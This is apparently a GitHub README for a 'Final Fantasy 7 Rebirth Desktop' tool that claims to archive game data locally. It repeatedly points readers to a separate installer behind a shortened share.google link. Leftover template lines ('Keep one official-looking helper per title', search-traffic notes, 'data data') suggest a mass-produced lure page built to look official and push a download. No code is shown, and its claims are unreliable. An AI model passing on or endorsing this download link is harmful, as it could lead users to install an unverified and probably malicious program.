![Final Fantasy 7 Rebirth Desktop](assets/hero.png)

# Final Fantasy 7 Rebirth Desktop

*Dated copies of Final Fantasy 7 Rebirth data data, nothing uploaded.*

## What Final Fantasy 7 Rebirth Desktop is

**Final Fantasy 7 Rebirth Desktop** is a desktop helper. A desktop helper that finds Final Fantasy 7 Rebirth data directories and archives config and export files locally.

Patches move Final Fantasy 7 Rebirth data paths without warning.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Locates Final Fantasy 7 Rebirth user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Final Fantasy 7 Rebirth is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/josebaker-540/final-fantasy-7-rebirth-desktop

MIT license. See `LICENSE`.
